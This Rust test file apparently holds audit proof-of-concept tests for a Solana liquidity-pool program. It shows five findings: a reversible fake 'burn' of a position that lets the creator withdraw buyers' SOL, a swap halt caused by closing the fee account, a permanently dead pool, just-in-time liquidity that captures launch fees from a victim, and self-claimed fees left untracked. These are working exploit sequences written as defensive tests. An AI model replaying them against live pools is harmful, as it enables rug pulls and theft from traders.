use aretia_pool_it::*;
use solana_keypair::Keypair;
use solana_signer::Signer;

const DECIMALS: u8 = 6;
const SUPPLY: u64 = 1_000_000_000_000_000;
const X0: u64 = 600_000_000_000_000;
const L0: u64 = 10 * SOL;

struct Launched { env: Env, creator: Keypair, mint: Address }

fn launch_full(lock: bool, sniper: u16, decay: u32) -> Launched {
    let mut env = Env::new();
    let creator = env.user(100);
    env.make_wsol(&creator.pubkey(), 0);
    let mint = env.make_mint(MintKind::Launch, DECIMALS, SUPPLY, &creator);
    let c = creator.pubkey();
    env.send(&[create_pool_ix_full(&c, &c, &c, &mint, X0, 0, L0, 25, lock, sniper, decay, 0)], &[&creator]).expect("create_pool");
    Launched { env, creator, mint }
}

fn trader(l: &mut Launched, sol: u64, tokens: u64) -> Keypair {
    let b = l.env.user(sol + 10);
    l.env.make_wsol(&b.pubkey(), sol * SOL);
    if tokens > 0 { l.env.give_tokens(&l.mint, DECIMALS, &l.creator, &b.pubkey(), tokens); } else { l.env.make_ata(&b.pubkey(), &l.mint); }
    b
}

/// F-1: "burning" a position by transferring it to the all-zero key (the System Program id) is reversible by the id holder.
#[test]
fn poc_fake_burn_then_reclaim_and_remove() {
    let mut l = launch_full(false, 0, 0);
    let c = l.creator.pubkey();
    // lock half, so we can show locked stays locked but the unlocked half comes back
    l.env.send(&[lock_ix(&c, &l.mint, L0 / 2)], &[&l.creator]).expect("lock half");
    let buyer = trader(&mut l, 200, 0);
    l.env.send(&[swap_ix(&buyer.pubkey(), &l.mint, true, 100 * SOL, 1)], &[&buyer]).expect("buy");
    // "Burn": give the position to 11111111111111111111111111111111
    l.env.send(&[transfer_position_ix(&c, &c, &l.mint, &SYSTEM)], &[&l.creator]).expect("burn transfer");
    let pos = l.env.position(&l.mint, &c);
    assert_eq!(pos.owner, SYSTEM);
    println!("after burn: owner={} shares={} locked={}", pos.owner, pos.shares, pos.locked);
    // Reclaim: add_liquidity re-initialises a position whose owner is the default key
    l.env.make_wsol(&c, 10 * SOL);
    l.env.send(&[add_ix(&c, &l.mint, 1_000, u64::MAX, u64::MAX)], &[&l.creator]).expect("reclaim via add_liquidity");
    let pos = l.env.position(&l.mint, &c);
    assert_eq!(pos.owner, c);
    println!("after reclaim: owner={} shares={} locked={}", pos.owner, pos.shares, pos.locked);
    let before_sol = l.env.wsol(&c);
    let unlocked = pos.shares - pos.locked;
    l.env.send(&[remove_ix(&c, &l.mint, unlocked, 0, 0)], &[&l.creator]).expect("remove reclaimed liquidity");
    let got = l.env.wsol(&c) - before_sol;
    println!("creator withdrew {} lamports of buyers' SOL after the 'burn'", got);
    assert!(got > 40 * SOL);
}

/// F-2: the fee wallet's wSOL ATA, if closed (the usual way a wallet unwraps), halts every swap on every pool.
#[test]
fn poc_fee_ata_closed_halts_swaps() {
    let mut l = launch_full(true, 0, 0);
    let buyer = trader(&mut l, 50, 0);
    l.env.send(&[swap_ix(&buyer.pubkey(), &l.mint, true, SOL, 1)], &[&buyer]).expect("buy ok");
    let fee_ata = wsol_ata(&FEE_WALLET);
    // simulate the fee wallet closing its wSOL account (CloseAccount by its owner)
    l.env.svm.set_account(fee_ata, solana_account::Account { lamports: 0, data: vec![], owner: SYSTEM, executable: false, rent_epoch: 0 }).unwrap();
    let r = l.env.send(&[swap_ix(&buyer.pubkey(), &l.mint, true, SOL, 1)], &[&buyer]);
    assert!(r.is_err(), "swap must fail while the fee ATA is missing");
    // anyone can re-create it
    let payer = l.env.payer.pubkey();
    l.env.send(&[ata_ix(&payer, &FEE_WALLET, &WSOL, &TOKEN)], &[]).expect("re-create");
    l.env.send(&[swap_ix(&buyer.pubkey(), &l.mint, true, SOL, 1)], &[&buyer]).expect("buy ok again");
}

/// F-3: an unlocked owner who removes everything kills the pool for that mint for good (l = 0, PDA cannot be reopened).
#[test]
fn poc_pool_dead_after_full_removal() {
    let mut l = launch_full(false, 0, 0);
    let c = l.creator.pubkey();
    l.env.make_wsol(&c, 0);
    l.env.send(&[remove_ix(&c, &l.mint, L0, 0, 0)], &[&l.creator]).expect("remove all");
    assert_eq!(l.env.pool(&l.mint).l, 0);
    l.env.make_wsol(&c, 10 * SOL);
    assert!(l.env.send(&[add_ix(&c, &l.mint, 1_000_000, u64::MAX, u64::MAX)], &[&l.creator]).is_err());
    assert!(l.env.send(&[create_pool_ix(&c, &c, &l.mint, 1_000_000, 0, L0, 25, false)], &[&l.creator]).is_err());
}

/// F-4: JIT liquidity in the launch window: an LP who adds right before a large buy and removes right after
/// takes most of the creator's 80% share of the 25% launch fee.
#[test]
fn poc_jit_launch_fee_capture() {
    let mut l = launch_full(true, 2_500, 900);
    let now = l.env.pool(&l.mint).created_at;
    l.env.set_time(now);
    // JIT LP holds tokens (bought earlier or from the creator); here: given by the creator
    let jit = trader(&mut l, 50, 300_000_000_000_000);
    let victim = trader(&mut l, 200, 0);
    let p0 = l.env.pool(&l.mint);
    let dl = p0.l / 2 * 1; // 0.5x the creator's liquidity (tokens needed: x/2)
    let jt0 = l.env.token_amount(&ata(&jit.pubkey(), &l.mint, &TOKEN_2022));
    let js0 = l.env.wsol(&jit.pubkey());
    l.env.send(&[add_ix(&jit.pubkey(), &l.mint, dl, u64::MAX, u64::MAX)], &[&jit]).expect("jit add");
    l.env.send(&[swap_ix(&victim.pubkey(), &l.mint, true, 100 * SOL, 1)], &[&victim]).expect("victim buy");
    let pos = l.env.position(&l.mint, &jit.pubkey());
    l.env.send(&[remove_ix(&jit.pubkey(), &l.mint, pos.shares, 0, 0)], &[&jit]).expect("jit remove");
    l.env.send(&[claim_ix(&jit.pubkey(), &l.mint)], &[&jit]).expect("jit claim");
    let jt1 = l.env.token_amount(&ata(&jit.pubkey(), &l.mint, &TOKEN_2022));
    let js1 = l.env.wsol(&jit.pubkey());
    let p1 = l.env.pool(&l.mint);
    // value tokens at the post-trade marginal price Y/X (lamports per raw unit)
    let tok_delta = jt0 as i128 - jt1 as i128; // tokens given up
    let sol_gain = js1 as i128 - js0 as i128;
    let price_num = (p1.y as i128 + p1.l as i128); let price_den = p1.x as i128 + p1.vx as i128;
    let tok_cost = tok_delta * price_num / price_den;
    println!("JIT: gave {} raw tokens (worth {} lamports at the post-trade price), got {} lamports; net {} lamports", tok_delta, tok_cost, sol_gain, sol_gain - tok_cost);
    println!("creator claimable LP fee now ~ {}", pool_math::pending_fee(L0, p1.acc, 0).unwrap());
    assert!(sol_gain - tok_cost > 0);
}

/// F-5: claim to the pool itself (recipient = pool PDA): claimed fees stay in the vault as an untracked surplus.
#[test]
fn poc_recipient_pool_self_transfer() {
    let mut l = launch_full(true, 0, 0);
    let c = l.creator.pubkey();
    let buyer = trader(&mut l, 50, 0);
    l.env.send(&[swap_ix(&buyer.pubkey(), &l.mint, true, 10 * SOL, 1)], &[&buyer]).expect("buy");
    let pool = pool_pda(&l.mint);
    l.env.send(&[set_recipient_ix(&c, &l.mint, &pool)], &[&l.creator]).expect("set recipient = pool");
    let r = l.env.send(&[claim_ix_to(&c, &l.mint, &c, &pool)], &[&l.creator]);
    println!("self-claim result ok={}", r.is_ok());
    let p = l.env.pool(&l.mint);
    println!("vault={} owed={}", l.env.wsol_account(&sol_vault_pda(&pool)), p.y + p.fee_reserve);
}
